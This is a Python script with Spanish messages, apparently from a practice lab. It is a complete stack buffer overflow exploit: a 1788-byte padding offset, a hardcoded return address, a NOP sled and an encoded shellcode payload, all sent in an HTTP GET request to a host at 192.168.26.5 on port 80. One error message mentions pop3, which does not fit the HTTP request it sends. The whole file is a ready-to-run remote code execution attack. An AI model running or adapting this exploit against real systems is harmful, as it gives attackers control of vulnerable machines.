
from pwn import *
import signal, sys, socket

def def_handler(sig, frame):
    print("\n\n[!] Se tenso... \n")
    sys.exit(-1)

signal.signal(signal.SIGINT, def_handler)

def buffer():
    offset = 1788
    buffer = b'A' * offset
    buffer += p32(0x77720ad0)
    buffer += b'\x90' * 200
    #BADCHARS -> \x00\x0d\x80
    shellcode = (b"\xbb\xfa\xe5\x16\x3e\xda\xd0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
b"\x52\x83\xe8\xfc\x31\x58\x0e\x03\xa2\xeb\xf4\xcb\xae\x1c\x7a"
b"\x33\x4e\xdd\x1b\xbd\xab\xec\x1b\xd9\xb8\x5f\xac\xa9\xec\x53"
b"\x47\xff\x04\xe7\x25\x28\x2b\x40\x83\x0e\x02\x51\xb8\x73\x05"
b"\xd1\xc3\xa7\xe5\xe8\x0b\xba\xe4\x2d\x71\x37\xb4\xe6\xfd\xea"
b"\x28\x82\x48\x37\xc3\xd8\x5d\x3f\x30\xa8\x5c\x6e\xe7\xa2\x06"
b"\xb0\x06\x66\x33\xf9\x10\x6b\x7e\xb3\xab\x5f\xf4\x42\x7d\xae"
b"\xf5\xe9\x40\x1e\x04\xf3\x85\x99\xf7\x86\xff\xd9\x8a\x90\xc4"
b"\xa0\x50\x14\xde\x03\x12\x8e\x3a\xb5\xf7\x49\xc9\xb9\xbc\x1e"
b"\x95\xdd\x43\xf2\xae\xda\xc8\xf5\x60\x6b\x8a\xd1\xa4\x37\x48"
b"\x7b\xfd\x9d\x3f\x84\x1d\x7e\x9f\x20\x56\x93\xf4\x58\x35\xfc"
b"\x39\x51\xc5\xfc\x55\xe2\xb6\xce\xfa\x58\x50\x63\x72\x47\xa7"
b"\x84\xa9\x3f\x37\x7b\x52\x40\x1e\xb8\x06\x10\x08\x69\x27\xfb"
b"\xc8\x96\xf2\xac\x98\x38\xad\x0c\x48\xf9\x1d\xe5\x82\xf6\x42"
b"\x15\xad\xdc\xea\xbc\x54\xb7\xd4\xe9\x4c\x43\xbd\xeb\x70\x5a"
b"\x66\x65\x96\x36\x88\x23\x01\xaf\x31\x6e\xd9\x4e\xbd\xa4\xa4"
b"\x51\x35\x4b\x59\x1f\xbe\x26\x49\xc8\x4e\x7d\x33\x5f\x50\xab"
b"\x5b\x03\xc3\x30\x9b\x4a\xf8\xee\xcc\x1b\xce\xe6\x98\xb1\x69"
b"\x51\xbe\x4b\xef\x9a\x7a\x90\xcc\x25\x83\x55\x68\x02\x93\xa3"
b"\x71\x0e\xc7\x7b\x24\xd8\xb1\x3d\x9e\xaa\x6b\x94\x4d\x65\xfb"
b"\x61\xbe\xb6\x7d\x6e\xeb\x40\x61\xdf\x42\x15\x9e\xd0\x02\x91"
b"\xe7\x0c\xb3\x5e\x32\x95\xc3\x14\x1e\xbc\x4b\xf1\xcb\xfc\x11"
b"\x02\x26\xc2\x2f\x81\xc2\xbb\xcb\x99\xa7\xbe\x90\x1d\x54\xb3"
b"\x89\xcb\x5a\x60\xa9\xd9"

)
    buffer += shellcode
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.26.5', 80))
        datos = b"GET"+ buffer + b'HTTP/1.1\r\n\r\n'
        s.send(datos)
        data = s.recv(1024)
        s.close()
    except:
        print("No se pudo conectar al pop3")
        sys.exit(-1)

        


if __name__ == '__main__':
    buffer() 